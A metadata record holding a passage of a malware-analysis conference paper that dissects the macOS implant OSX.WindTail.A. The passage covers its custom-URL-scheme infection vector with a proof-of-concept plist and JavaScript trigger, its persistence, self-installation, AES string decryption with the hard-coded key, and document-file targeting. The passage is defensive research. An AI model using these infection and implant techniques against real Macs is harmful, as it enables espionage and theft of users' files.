{
    "id": "457d10d3-a285-4eef-a0e8-e1fc5c9a7f47",
    "created_at": "2023-01-12T15:03:58.357127Z",
    "updated_at": "2025-03-27T02:16:25.80571Z",
    "deleted_at": null,
    "sha1_hash": "c7a15e28eefa223b2845c351ed7fb7821c8de74f",
    "title": "2019-12-12 - Cyber espionage in the Middle East- unravelling OSX.WindTail",
    "authors": "",
    "file_creation_date": "2022-05-29T01:22:59Z",
    "file_modification_date": "2022-05-29T01:22:59Z",
    "file_size": 1961469,
    "plain_text": "# VB2019 paper: Cyber espionage in the Middle East: unravelling OSX.WindTail\n\n**[virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail/](https://www.virusbulletin.com/virusbulletin/2020/04/vb2019-paper-cyber-espionage-middle-east-unravelling-osxwindtail/)**\n\n### Patrick Wardle\n\n_Jamf, USA_\n\nTable of contents\n\nAbstract\n\nBackground\n\nRemote Mac exploitation (via custom URL schemes)\n\nOSX.WindTail: persistence\n\nOSX.WindTail: installation\n\nOSX.WindTail: string decryption\n\nOSX.WindTail: payload\n\nOSX.WindTail: C&C servers\n\nOSX.WindTail: self-delete logic\n\nOSX.WindTail: detection\n\nConclusion\n\nReferences\n\n## Abstract\n\nIt’s no secret that many nation states possess offensive macOS cyber capabilities, though\nsuch capabilities are rarely publicly uncovered. However, when such tools are detected,\nthey provide unparalleled insight into the operations and techniques utilized by advanced\nadversaries. In this paper, we’ll comprehensively dissect one such tool, OSX.WindTail.A,\nthe first-stage macOS implant utilized by the WINDSHIFT APT group (which targeted\nindividuals of a Middle-Eastern government). After analysing the malware’s unique infection\nvector, we’ll discuss its method of persistence and its capabilities. To conclude, we’ll present\nheuristic methods that can generically detect OSX.WindTail.A, as well as other advanced\n_macOS threats._\n\n## Background\n\nAt the Hack in the Box GSEC cybersecurity conference, Taha Karim (head of the malware\nresearch labs at DarkMatter) presented some rather intriguing research [1].\n\n\n-----\n\nIn his presentation, he detailed a new APT group (WINDSHIFT) that engaged in highly\ntargeted cyber-espionage campaigns. A Forbes article [2] also covered Karim’s research,\nand noted that:\n\n‘[The APT] targeted specific individuals working in government departments and critical\ninfrastructure across the Middle East.’ [2]\n\nIn his talk, Karim discussed the WINDSHIFT APT group and provided an overview both of\ntheir macOS exploitation techniques and of their malware (OSX.WindTail.A,\nOSX.WindTail.B and OSX.WindTape). However, deeper technical concepts were not\ncovered (probably due to time constraints).\n\n_Note: The aim of this paper is not simply to regurgitate Karim’s excellent research. Instead,_\n_it aims to build from it by diving far deeper into the technical details of both the exploitation_\n_mechanism and the malware (OSX.WindTail.A) utilized by WINDSHIFT._\n\nIn this paper we’ll first cover the technical aspects of the rather novel exploitation\nmechanism employed by the attackers. Following this, we’ll dissect WINDSHIFT’s firststage macOS implant (OSX.WindTail.A) by detailing its method of persistence, its\ncapabilities and detection. Finally, we’ll (briefly) discuss various heuristic methods that can\ngenerically detect OSX.WindTail.A as well as other sophisticated macOS threats.\n\n## Remote Mac exploitation (via custom URL schemes)\n\nIn order to remotely infect their macOS targets, the WINDSHIFT APT group abused\n_macOS’s support for custom URL schemes. Although user interaction was required, it was_\nminimal and could be ‘influenced’ by the attacker. Moreover, the fact that this infection\nvector succeeded in the wild (against government targets in the Middle East) illustrates that\nthe requirement for such user interactions unfortunately did not prevent infections.\n\nIn this section of the paper, we’ll first discuss custom document and URL schemes from the\npoint of view of macOS. Following this, we’ll illustrate exactly how the WINDSHIFT APT\ngroup abused custom URL schemes to remotely infect their targets.\n\nOn macOS, applications can ‘advertise’ that they support (or ‘handle’) various document\ntypes and/or custom URL schemes. Think of it as an application saying, ‘if a user tries to\nopen a document of type foo or a URL with a scheme of bar, I can handle that!’. You’ve\nsurely encountered this feature of macOS. For example, when one double-clicks a .pdf\ndocument, Preview.app is automatically launched to handle the document. Meanwhile, in a\nbrowser, clicking a link to an application in the official Mac App Store launches Apple’s App\nStore.app to process the request. Unfortunately, the way Apple decided to implement\n(specifically, ‘register’) document handlers and custom URL schemes leaves them ripe for\nabuse!\n\n\n-----\n\n_Note: Though document handlers and URL schemes are slightly different, from an OS point_\n_of view, they are essential the same (and thus implemented in similar manners)._\n\nPrevious research by the author [3] discussed a piece of adware (Mac File Opener) that\nabused custom document handlers as a stealthy way to achieve persistence. In short, as\nthe malware ‘advertised’ that it supported over 200 types of files, whenever the user opened\none of these file types, the malware would automatically be launched by the OS to handle\n(in theory to display) the document. Persistence with a twist!\n\nNote: If there is already an application registered for a file type (e.g. .pdf, .html, etc.), it\nappears that it cannot (easily?) be usurped.\n\nDuring the course of said research, the first question was: how did the Mac File Opener\nadware (or any application for that matter) ‘advertise’ which files it supported (and thus\nshould be automatically invoked when such a documented was accessed by the user)?\nSecondly, how does the OS process and register this information? As the answers to both\nquestions are detailed in [3], reading that paper is recommended, but we’ll briefly\nsummarize them here as well.\n\nSo how does an application tell the OS what type(s) of file it is capable of handling? The\nanswer is in its Info.plist file. As noted, the Mac File Opener adware ‘supports’ over 200 file\ntypes, which can be confirmed by dumping its Info.plist (note the ‘Document types’ array),\nas shown in Figure 1.\n\n\n-----\n\nFigure\n\n1: Mac File Opener adware ‘supports’ over 200 file types, as confirmed by dumping its\nInfo.plist.\n\nIn the ‘raw’ Info.plist, this information is stored in the CFBundleDocumentTypes array. Apple\nstates:\n\n‘CFBundleDocumentTypes (Array - iOS, OS X) contains an array of dictionaries that\nassociate one or more document types with your app. Each dictionary is called a typedefinition dictionary and contains keys used to define the document.’ [4]\n\nBelow, observe Mac File Opener’s entry for the file type .7z (7Zip). Note the\nCFBundleTypeExtensions key, whose value is set to the file extension the adware claims to\nhandle:\n\n\n-----\n\n```\n$ cat Mac File Opener.app/Contents/Info.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://\nwww.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>BuildMachineOSBuild</key>\n  <string>14F27</string>\n  <key>CFBundleDevelopmentRegion</key>\n  <string>en</string>\n  <key>CFBundleDocumentTypes</key>\n  <array>\n    <dict>\n      <key>CFBundleTypeExtensions</key>\n      <array>\n        <string>7z</string>\n      </array>\n      <key>CFBundleTypeName</key>\n      <string>DocumentType</string>\n      <key>CFBundleTypeOSTypes</key>\n      <array>\n        <string>????</string>\n      </array>\n      <key>CFBundleTypeRole</key>\n      <string>Viewer</string>\n      <key>LSHandlerRank</key>\n      <string>Alternate</string>\n      <key>NSDocumentClass</key>\n      <string>Document</string>\n    </dict>\n  ...\n\n```\nThe second question is answered by understanding how macOS handles the ‘registration’\nof these file or ‘document’ handlers. As noted in [4], this happens automatically as soon as\nthe application is saved to the file system.\n\nSpecifically:\n\nAn application (or malware) is downloaded (saved to the file system)\nThis triggers an XPC message sent to the launch services daemon (lsd)\nThe lsd parses the application’s Info.plist to extract and register any ‘document\nhandlers’ to a persistent database.\n\nThis can be observed via macOS’s built-in file monitor utility, ‘fs_usage’. For example, when\nthe Mac File Opener.app adware is saved to disk, the launch services daemon\nautomatically parses its Info.plist file:\n```\nfs_usage -w -f filesystem | grep Info.plist\nopen   Mac File Opener.app/Contents/Info.plist lsd.16457\nfstat64   F=4 lsd.16457\nread   F=4 B=0x18a97 lsd.16457\n\n```\n\n-----\n\nOne can dump lsd s database via the lsregister utility (found in /System/\nLibrary/Frameworks/CoreServices.framework/Frameworks/\nLaunchServices.framework/Support/). When invoked with the ‘-dump’ flag, it will display all\napplications that specify ‘document handlers’, which were automatically registered (by lsd).\nFor example, one can see the malicious application Mac File Opener is present, along with\nthe documents (file types) it registered for (e.g. .7z, etc.):\n```\n$ lsregister -dump\n...\npath: /Users/user/Downloads/Mac File Opener.app\nname: Mac File Opener\nidentifier: com.pcvark.Mac-File-Opener (0x80025f61)\nexecutable: Contents/MacOS/Mac File Opener\n-------------------------------------------------------claim id: 31508\n  name: DocumentType\n  rank: Alternate\n  roles: Viewer\n  flags: doc-type\n  bindings: .7z\n...\n\n```\nOnce an application’s (or malware’s) document handlers have (automatically!) been\nregistered, that application will automatically be invoked any time a user attempts to open a\ndocument whose type matches a registered handler.\n\nDigging into macOS internals, this registration is handled by the launch services framework.\nSpecifically, the ‘LSBundleCopyOrCheckNode’ method (and\n‘_LSBundleCopyOrCheckNode_block_invoke’) handles this lookup (of matching a\ndocument type to a registered application) and then the execution of registered application:\n```\n(lldb) b ___LSBundleCopyOrCheckNode_block_invoke\n...\n(lldb) x/gx $rdx\n0x700000115c48: 0x00007fd3b4a9c520\n(lldb) po 0x00007fd3b4a9c520\n<FSNode 0x7fd3b4a9c520> { flags = 0x00000020, path = '/Users/user/Desktop/Mac File\nOpener.app' }\n\n```\nIn summary:\n\nApplications can ‘advertise’ that they handle various documents or file types.\nThe OS will automatically register those ‘document handlers’ as soon as the\napplication is saved to the file system.\nAs files are opened, the ‘launch services’ database is consulted to execute the\nappropriate application to handle (read: open) the file.\n\n\n-----\n\nNow an examination of custom URL schemes and their handlers. Again, from the point of\nview of macOS, such URL scheme handlers are basically just document handlers, but for\nURLs.\n\nThis also means that custom URL scheme handlers:\n\nare registered automatically by macOS as soon as the application (that ‘advertises’\nsupport for such handlers) is saved to the file system\nwill trigger the execution of the (automatically registered) handler application when the\ncustom URL scheme is invoked.\n\nAs both of these actions can be triggered from a web page, it should be easy to see where\nthis all goes wrong!\n\nNow, let’s walk through a proof of concept, to illustrate how an attacker (such as the\nWINDSHIFT APT group) could abuse custom URL scheme handlers to remotely infect a\n_Mac (noting again that some user interaction is required)._\n\nThe proof of concept is a simple macOS application. The logic of the application is\nirrelevant, however we must edit the app’s Info.plist file to ‘advertise’ that fact that we will\nsupport a custom URL scheme. In Xcode, we add a URL types array and specify the name\nof our scheme (windshift://) and a URL identifier, as shown in Figure 2.\n\nFigure 2: The URL types array (CFBundleURLTypes) contains a custom URL scheme and a\nURL identifier.\n\nExamining the raw Info.plist illustrates that this maps to keys such as CFBundleURLTypes,\nCFBundleURLSchemes and CFBundleURLName:\n\n\n-----\n\n```\n<key>CFBundleURLTypes</key>\n<array>\n  <dict>\n    <key>CFBundleURLSchemes</key>\n    <array>\n      <string>windshift</string>\n    </array>\n    <key>CFBundleURLName</key>\n    <string>com.foo.bar.WindShift</string>\n  </dict>\n</array>\n\n```\nAs soon as this application is compiled (or downloaded) the launch services daemon will\nparse its bundle (specifically its Info.plist), detect the presence of the custom URL scheme\nhandlers, and register it (them). Again, note this all happens automatically.\n\nTo confirm registration of our ‘windshift://’ URL scheme, we dump the ‘launch services’\ndatabase (via lsregister -dump). Indeed, there is the proof of concept application\n(WindShift.app) along with the custom URL scheme (CFBundleURLSchemes: (windshift)):\n```\nBundleClass: kLSBundleClassApplication\nContainer mount state: mounted\n...\n  path:\n~/Projects/WindShift/DerivedData/WindShift/Build/Products/Debug/WindShift.app\n  name: WindShift\n  ....\n  executable: Contents/MacOS/WindShift\n....\n  CFBundleURLTypes = (\n    {\n      CFBundleURLName = \"com.foo.bar.WindShift\";\n      CFBundleURLSchemes = (\n      windshift\n    );\n   }\n  );\n}\nclaim id:   386204\n  name:   com.foo.bar.WindShift\n  rank:   Default\n  roles:  Viewer\n  flags:   url-type\n  bindings:   windshift:\n\n```\nAs the custom URL handler (‘windshift’) has (automatically) been registered with the\nsystem, the proof of concept application (Windshift.app) can be now be launched directly\nvia a browser. To confirm, one can simply ‘browse’ to the custom URL scheme, windshift://.\n\nWhile older versions of popular browsers would blindly launch the application, more recent\nversions will now request user approval:\n\n\n-----\n\nFigure 3: User approval request.\n\nEven today, if the user clicks ‘Allow’, macOS will launch the registered application:\n\nFigure 4: macOS launches the registered application.\n\nWith a sufficient understanding of custom URL schemes, we now briefly discuss how to\nleverage them to remotely exploit Mac systems.\n\nFirst, the target must be enticed to browse to a website under the attacker’s control. As we’ll\nsee, the WINDSHIFT APT group (successfully) used phishing emails for this purpose.\n\n\n-----\n\nOnce the target visits the malicious website, the website can automatically initiate the\ndownload of an archive (.zip) file that contains the malicious application (which contains a\ncustom URL scheme handler). If the Mac user is using Safari, the archive will be unzipped\nautomatically, as Apple thinks it’s wise to automatically open ‘safe’ files. This fact is\nparamount, as it means the malicious application (vs. just a compressed zip archive) will\nnow be on the user’s file system, which will automatically trigger the registration of any\ncustom URL scheme handlers!\n\nNow that the malicious app’s custom URL scheme has been registered (on the target’s\nsystem), code within the malicious web page can load or ‘browse’ to the custom URL (for\nexample: windshift://). This is easy to accomplish in JavaScript:\nlocation.replace(‘windshift://’);.\n\nBehind the scenes, macOS will look up the handler for this custom URL scheme – which, of\ncourse, is the malicious application (that was just downloaded). Once this lookup is\ncompleted, the OS will attempt to launch the malicious application to handle the URL\nrequest.\n\nLuckily (for Mac users), as noted, in most recent versions of Safari this will trigger a warning\n(as shown in Figure 3).\n\nHowever, the characters between the quotation marks in the alert are attacker-controlled,\nas they are the name of the application Thus, an attacker can easily make this pop-up look\nrather mundane, unintimidating, or even amusing:\n\n\n-----\n\nFigure 5: The attacker controls the characters between the quotation marks.\n\n_Note: Normally an application cannot have an extension such as .txt or .com. However, as_\n_the name of the application can contain unicode characters, an attacker can leverage a_\n_homograph attack. This allows us to name the malicious application something like_\n_‘Attachment.TXT’ (where the ‘X’ is really the Carian Letter X)._\n\nWhile recent versions of Safari will prompt the user before launching the application that\nhas been registered to handle custom URL requests, older version of Safari (e.g. the default\ninstall on El Capitan) do not. Instead, such versions of Safari show no warning and blindly\nattempt to launch the (malicious) application.\n\nRegardless of Safari version, an attacker will have one more hurdle: file quarantine.\n\nFile quarantine is responsible for the pop-up that is displayed when an application from the\nInternet is first launched.\n\nFigure 6: File quarantine is responsible for the warning.\n\nFrom a security point of view, the good news is that some percentage of Mac users will click\n‘Cancel’. Unfortunately, some will not – as was demonstrated by WINDSHIFT APT’s\nsuccessful attacks.\n\n\n-----\n\n_Note: You might be wondering about Gatekeeper. In its default configuration, Gatekeeper_\n_allows signed applications. The malware used by the WINDSHIFT APT group was signed_\n_(as is most Mac malware these days). So Gatekeeper doesn’t even come into play!_\n\nBefore diving into the specifics of the WINDSHIFT exploit, Figure 7 summarizes the custom\nURL scheme attack, with a diagrammatic overview.\n\nFigure 7: Overview of custom URL scheme attack.\n\nIn order to initiate the exploitation of their Mac targets, the WINDSHIFT APT group abused\nseveral methods including malicious emails. Such emails would either contain the malware\ndirectly as an attachment or contain a phishing link to a malicious site that would trigger the\ncustom URL scheme exploit.\n\nIn his presentation [1], Karim included the image shown in Figure 8, which illustrates a\nmalicious WINDSHIFT email (that includes the malware as an attachment).\n\n\n-----\n\nFigure 8: Malicious WINDSHIFT email [1].\n\nThough no malware samples were shared by Karim, noted Mac security researcher Phil\nStokes leveraged information contained in the above image, (i.e. the file name:\nMeeting_Agenda.zip) to uncover a WINDSHIFT malware sample on VirusTotal.\n\nFile: Meeting_Agenda.app\n\nSHA-256:\n842F8D9ACC11438DEF811F07EBAD5BC675DFFFBCF491F5F04209D31CCD6D18E5\n\nFigure 9: WINDSHIFT malware sample on VirusTotal.\n\nUsing the ‘similar-to:’ search modifier, the author was able to uncover three other samples\n(that at the time were not flagged as malicious by any anti-virus engine on the site), as\nshown in Figure 10.\n\nNPC_Agenda_230617.app\n\nSHA-1:\nFF90A290A7B9A11AE517E605ECED80920ED985E0F2CD4A6D265E72D8EE2F4802\n\n\n-----\n\nScandal_Report_2017.app\nSHA-1:\n3085C2AD23F35A2AC0A3A87631991EEB9497DBE68D19C8DD2869578A33ECBA0D\n\nFinal_Presentation.app\nSHA-1:\nCEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F\n\nFigure 10: Three other samples were uncovered by using the ‘similar-to:’search modifier.\n\nNote that this malware (ab)uses Microsoft Office icons, probably to avoid raising suspicion.\n\n\n-----\n\nFigure 11: The malware uses Microsoft Office icons.\n\n_Note: For the remainder of this paper, we’ll focus on the ‘Final_Presentation’ application_\n_(SHA256:_\n_CEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F)._\n_This (and the other samples found on VirusTotal) are WINDSHIFT’s first-stage macOS_\n_implant, OSX.WindTail.A._\n\nUnzipping Final_Presentation.zip reveals the Final_Presentation.app, which (as expected)\nis a standard macOS application bundle.\n\n\n-----\n\nFigure 12: The Final_Presentation.app is a standard macOS application bundle.\n\nThe application’s main executable is named ‘usrnode,’ as specified in the application’s\nInfo.plist file (CFBundleExecutable: usrnode):\n\n\n-----\n\n```\n$ cat /Users/patrick/Downloads/WindShift/Final_Presentation.app/\nContents/Info.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<plist version=\"1.0\">\n<dict>\n  ...\n  <key>CFBundleExecutable</key>\n  <string>usrnode</string>\n  ...\n  <key>CFBundleIdentifier</key>\n  <string>com.alis.tre</string>\n  ...\n  <key>CFBundleURLTypes</key>\n  <array>\n    <dict>\n      <key>CFBundleURLName</key>\n      <string>Local File</string>\n      <key>CFBundleURLSchemes</key>\n      <array>\n        <string>openurl2622007</string>\n      </array>\n    </dict>\n  </array>\n  ...\n  <key>LSMinimumSystemVersion</key>\n  <string>10.7</string>\n  ...\n  <key>NSUIElement</key>\n  <string>1</string>\n</dict>\n</plist>\n\n```\nOther interesting keys in the Info.plist file include ‘LSMinimumSystemVersion’, which\nindicates that the (malicious) application is compatible with rather ancient versions of OSX\n(10.7, Lion), and the ‘NSUIElement’ key, which tells the OS to execute the application\nwithout a dock icon or menu (i.e. hidden).\n\nHowever, the most interesting is the ‘CFBundleURLSchemes’ key (within the\nCFBundleURLTypes). As noted, this key holds an array of custom URL schemes that the\napplication implements (here: openurl2622007). As previously discussed, this allows the\nmalware to be launched directly from a malicious web page.\n\n_Note: In his presentation, Karim stated: ‘The specially crafted web page will download a file,_\n_VVIP_Contacts.zip, and will call a URL scheme: openurl2622015’ [1]. Note that the custom_\n_URL scheme in the Final_Presentation sample closely ‘matches’ this._\n\nLet’s now reverse the OSX.WindTail.A binary to uncover its method of persistence,\ncapabilities and more!\n\n### OSX.WindTail: persistence\n\n\n-----\n\nIn this part of the paper, we ll analyse the method of persistence leveraged by\nOSX.WindTail to ensure it is automatically (re)started each time the infected user logs in.\n\n_Note: Here, and for the remainder of this paper, we’ll analyse the OSX.WindTail.A specimen_\n_‘Final_Presentation’ application (SHA256:_\n_CEEBF77899D2676193DBB79E660AD62D97220FD0A54380804BC3737C77407D2F)._\n_Note that the other specimens found on VirusTotal (NPC_Agenda_230617,_\n_Scandal_Report_2017, etc.) are essentially identical._\n\nOur examination of the malware begins in the ‘main’ function of the application’s binary\n(‘usrnode’):\n```\nint main(int argv, char** argv) {\n  r12 = [NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];\n  rbx = LSSharedFileListCreate(0x0, _kLSSharedFileListSessionLoginItems,\n          0x0);\n  LSSharedFileListInsertItemURL(rbx, _kLSSharedFileListItemLast, 0x0, 0x0,\n          r12, 0x0, 0x0);\n  ...\n  rax = NSApplicationMain(r15, r14);\n  return rax;\n}\n\n```\nAfter resolving the path to itself, the malware invokes the ‘LSSharedFileListInsertItemURL’\nAPI. This adds a login item, which is a mechanism to gain persistence and ensure that the\n(malicious) application will automatically be (re)started every time the user logs in. This\npersistence is visible via the System Preferences application.\n\nFigure 13: Persistence of Final_Presentation is visible.\n\nClearly not the stealthiest persistence mechanism, but it suffices.\n\n### OSX.WindTail: installation\n\nOnce the malware has persisted, the code in the main function invokes the\n‘NSApplicationMain’ function, which in turn invokes the ‘applicationDidFinishLaunching’\n(delegate) method:\n\n\n-----\n\n_Note: The applicationDidFinishLaunching method is invoked automatically after the_\n_application has been launched and initialized’ [5]. Thus, when analysing malicious macOS_\n_applications, always investigate this method!_\n```\n-(void)applicationDidFinishLaunching:(void *)arg2 {\n  r15 = self;\n  r14 = [[NSDate alloc] init];\n  rbx = [[NSDateFormatter alloc] init];\n  [rbx setDateFormat:@\"dd-MM-YYYYHH:mm:ss\"];\n  r14 = [[[[rbx stringFromDate:r14] componentsSeparatedByCharactersInSet:\n    [NSCharacterSet characterSetWithCharactersInString:cfstring____]]\n    componentsJoinedByString:@\"\"] stringByReplacingOccurrencesOfString:@\" \"\n    withString:@\"\"];\n  rcx = [[NSBundle mainBundle] resourcePath];\n  rbx = [NSString stringWithFormat:@\"%@/date.txt\", rcx];\n  rax = [NSFileManager defaultManager];\n  rdx = rbx;\n  if ([rax fileExistsAtPath:rdx] == 0x0) {\n    rax = arc4random();\n    rax = [NSString stringWithFormat:@\"%@%@\", r14,\n      [[NSNumber numberWithInt:rax - (rax * 0x51eb851f >> 0x25) * 0x64,\n      (rax * 0x51eb851f >> 0x25) * 0x64] stringValue]];\n    rcx = 0x1;\n    r8 = 0x4;\n    rdx = rbx;\n    rax = [rax writeToFile:rdx atomically:rcx encoding:r8 error:&var_28];\n    if (rax == 0x0) {\n      r8 = 0x4;\n      rax = [NSUserDefaults standardUserDefaults];\n      rcx = @\"GenrateDeviceName\";\n      rdx = 0x1;\n      [rax setBool:rdx forKey:rcx, r8];\n      [[NSUserDefaults standardUserDefaults] synchronize];\n    }\n    }\n    [r15 read];\n    [r15 tuffel];\n    [NSThread detachNewThreadSelector:@selector(mydel) toTarget:r15 withObject:\n0x0];\n    return;\n}\n\n```\nThe code in the ‘applicationDidFinishLaunching’ delegate method performs the following:\n\n1. Generates the current date and time, saving it into a formatted string.\n2. Builds a path to the date.txt, found within its application bundle\n\n(Contents/Resources/date.txt).\n3. If this file doesn’t exist, it writes out the (formatted) date/time string and a random\n\nnumber.\n4. If this fails, it sets the ‘GenrateDeviceName’ (sic) user default key to true.\n5. Reads in the data from the date.txt file.\n6 Invokes the ‘tuffel’ method\n\n\n-----\n\n7. Spawns a thread to execute the mydel method.\n\nSteps 1-5 generate, and on subsequent executions (re)load, a unique identifier for the\nimplant (e.g. 2012201800380925). This may be observed via macOS’s built-in fs_usage\nutility:\n```\n# fs_usage -w -filesystem | grep date.txt\n  lstat64 /Users/user/Desktop/Final_Presentation.app/Contents/\n  Resources/date.txt usrnode.8894\n  open F=3 (R_____) /Users/user/Desktop/\n  Final_Presentation.app/Contents/Resources/date.txt usrnode.8894\n  ...\n  # cat ~/Desktop/Final_Presentation.app/Contents/Resources/date.txt\n  2012201800380925\n\n```\n_Note: Such a ‘per-implant’ identifier helps a remote attacker keep track (or organize)_\n_infected hosts._\n\nOnce this logic is completed, the ‘tuffel’ method is invoked to execute the main logic of the\nmalware which includes:\n\n1. Installation\n2. File collection and exfiltration\n\nLet’s take a closer look at both of these.\n\nThe install logic of the malware is (largely) handled by the ‘cp’ method. This method is\ninvoked via the ‘init’ method of the ‘appdele’ class (which is invoked in the ‘tuffel’ method).\n```\n/* @class appdele */\n-(void)cp {\n  r13 = self;\n  var_30 = r13;\n  *qword_100015f20 = [[NSFileManager alloc] init];\n  r15 = [[NSBundle mainBundle] bundlePath];\n  rbx = [r15 lastPathComponent];\n  r12 = NSHomeDirectory();\n  r8 = [r13 yoop:@\"oX0s4Qj3GiAzAnOmzGqjOA==\"];\n  rcx = r12;\n  rbx = [NSString stringWithFormat:@\"%@%@%@%@\", rcx, r8, @\"/\", rbx];\n  ...\n  if (([*qword_100015f20 copyItemAtPath:r15 toPath:rbx error:0x0] & 0xff) == 0x1)\n    goto loc_10000297b;\n  ...\n\n```\nIn the ‘cp’ method, the malware constructs a path to its own application bundle via\n\n[[NSBundle mainBundle] bundlePath]. After retrieving the bundle’s name (via the\n‘lastPathComponent’ method) the malware invokes the ‘NSHomeDirectory’ function to get\nthe user’s home directory. And what about the encoded, encrypted string,\n‘oX0s4Qj3GiAzAnOmzGqjOA==’? That decrypts to ‘/Library’.\n\n\n-----\n\n### OSX.WindTail: string decryption\n\nString decryption is handled via the ‘yoop’ method (which, in turn, invokes decoding and\ndecryption helper methods):\n```\n-(void *)yoop:(void *)arg2 {\n  rax = [[[NSString alloc] initWithData:[[yu decode:arg2]\n    AESDecryptWithPassphrase:cfstring__] encoding:0x1]\n    stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];\n  return rax;\n}\n\n```\nLooking closer at the call to the decryption method (‘AESDecryptWithPassphrase’) reveals\nthe hard-coded AES decryption key:\n```\ncfstring___100013480:\n  0x000000010001c1a8, 0x00000000000007d0,\n  0x000000010000bc2a, 0x0000000000000010 ; u\"æ$&łŁńŚŽ~Ę?|!~<OE\",\n\n```\nThis is the exact same key as Karim showed in his slides [1].\n\nFigure 14: Karim showed the same key in his slides [1].\n\nTo dynamically observe string decryption, one can simply set a breakpoint within the ‘yoop’\nmethod, and then dump the (now) decrypted strings. For example, as may be seen in the\ndebugger output, the aforementioned string ‘oX0s4Qj3GiAzAnOmzGqjOA==’ decrypts to\n‘/Library’.\n```\n(lldb)\n0x100002873 <+125>: movq 0x12bce(%rip), %rsi ; \"yoop:\"\n0x10000287a <+132>: leaq 0x10ddf(%rip), %rdx ; @\"oX0s4Qj3GiAzAnOmzGqjOA==\"\n0x100002881 <+139>: movq %r13, %rdi\n0x100002884 <+142>: callq *%r14 ; objc_msgSend\n...\n//after stepping over callq *%r14 (objc_msgSend)\n(lldb) po $rax\n/Library\n\n```\n\n-----\n\n_Note: The x64 ABI for macOS dictates that the return value of a method or function is_\n_stored in the RAX register. In other words, once a method (or function) returns, it simply_\n_displays what’s in the RAX register to see what’s returned (e.g. the decrypted string)._\n\nReturning to the install logic in the ‘cp’ method, once string decryption has commenced, the\nmalware builds a full path via the ‘stringWithFormat’ method. On an infected virtual\nmachine, this produces\n```\n(lldb) po $rdi\n<NSFileManager: 0x1001221e0>\n//method name\n(lldb) x/s $rsi\n0x7fff6cabf632: \"copyItemAtPath:toPath:error:\"\n//source path\n(lldb) po $rdx\n/Users/user/Desktop/Final_Presentation.app\n//destination path\n(lldb) po $rcx\n/Users/user/Library/Final_Presentation.app\n\n```\nOr passively via macOS’s built-in file monitor utility, fs_usage:\n```\n# fs_usage -w -f filesystem | grep -i usrnode\nopen /Users/user/Desktop/Final_Presentation.app\nmkdir /Users/user/Library/Final_Presentation.app\n...\n\n```\nThough the normal user is unlikely to be poking around in the ~/Library folder, if they did\n(and their Mac was infected with OSX.WindTail), the malware would be rather hard to miss,\nas shown in Figure 15.\n\n\n-----\n\nFigure 15: In the ~/Library folder the malware is hard to miss.\n\nThe malware then executes the installed copy via the ‘open’ command. This can be\nobserved via the author’s open-source process monitor library, ProcInfo [6]:\n```\n# ./procInfo\n[ process start]\npid: 917\npath: /usr/bin/open\nuser: 501\nargs: (\n  open,\n  \"-a\",\n  \"/Users/user/Library/Final_Presentation.app\"\n)\n\n```\nRecall that as soon as the malware (or its copy) is launched, it persists itself a login item.\nAmusingly, this means that both the original malware and its installed copy will both be\npersisted.\n\n\n-----\n\nFigure 16: Both the original malware and its installed copy will be persisted.\n\n### OSX.WindTail: payload\n\nAt this point the malware has been installed and persisted (twice). But the question\nremains, what does the malware actually do?\n\nVia the ‘init’ method of ‘appdele’ (recall, invoked via the ‘tuffel’ method), the malware\ninvokes a method named ‘yan’.\n```\n/* @class appdele */\n-(void *)yan {\n  var_30 = [self yoop:@\"BouCfWujdfbAUfCos/iIOg==\"];\n  [self yoop:@\"Bk0WPpt0IFFT30CP6ci9jg==\"];\n  [self yoop:@\"RYfzGQY52uA9SnTjDWCugw==\"];\n  [self yoop:@\"XCrcQ4M8lnb1sJJo7zuLmQ==\"];\n  [self yoop:@\"3J1OfDEiMfxgQVZur/neGQ==\"];\n  [self yoop:@\"Nxv5JOV6nsvg/lfNuk3rWw==\"];\n  [self yoop:@\"Es1qIvgb4wmPAWwlagmNYQ==\"];\n  [self yoop:@\"eOA0XJNs/eeFUVMThfZjTA==\"];\n  [self yoop:@\"B/9RICA+yl4vZrIeyON8cQ==\"];\n  [self yoop:@\"B8fvRmZ1LJ74Q5OiD9KISw==\"];\n  rax = [NSMutableArray arrayWithObjects:var_30];\n  return rax;\n}\n\n```\n\n-----\n\nVia calls to the string decryption method yop, the yan method appears to return an array\nof the decrypted strings. A debugger can be used to decrypt theses strings. Specifically,\none can set a breakpoint on the method (address: 0x000000010000238b). Once this\nbreakpoint is hit, executing lldb’s ‘finish’ command will execute the entire method, then stop\nas soon as it returns. Now, a pointer to the array of decrypted strings (that appear to be file\nextensions) will be held in the RAX register.\n```\n(lldb) b 0x000000010000238b\n(lldb) c\n...\n->  0x10000238b <+0>: pushq %rbp\n  0x10000238c <+1>: movq %rsp, %rbp\n  0x10000238f <+4>: pushq %r15\n  0x100002391 <+6>: pushq %r14\n(lldb) finish\n(lldb) po $rax\n<__NSArrayM 0x10018f920>(\ndoc, docx, ppt, pdf, xls,\nxlsx, db, txt, rtf, pptx)\n\n```\nAnother interesting method is named ‘fist’ (invoked via the ‘df’ method, which is scheduled\nvia an NSTimer).\n\nThe ‘fist’ method is rather large, but perusing its decompilation reveals the invocation of\n_Apple APIs such as ‘contentsOfDirectoryAtPath’, ‘pathExtension’, and (string) comparisons._\nIt seems reasonable to assume it is enumerating files, perhaps looking for files that match\nthe previously decrypted file extensions.\n\nSetting various breakpoints within the ‘fist’ method reveals the malware first enumerating\nand building a list of directories:\n\n\n-----\n\n```\n(lldb) po $rdi\n<__NSArrayM 0x10018e360>(\n/Library,\n/net,\n/Network,\n/private,\n/sbin,\n/System,\n/Users,\n/usr,\n/vm,\n/Volumes,\n/Applications/App Store.app,\n/Applications/Automator.app,\n/Applications/Calculator.app,\n/Applications/Calendar.app,\n/Applications/Chess.app,\n/Applications/Contacts.app,\n/Applications/Dashboard.app,\n/Applications/Dictionary.app,\n/Applications/DVD Player.app,\n...\n\n```\nThe malware then adds files that match the (previously) decrypted file extensions (doc, db,\nrtf, etc.) to an array (named 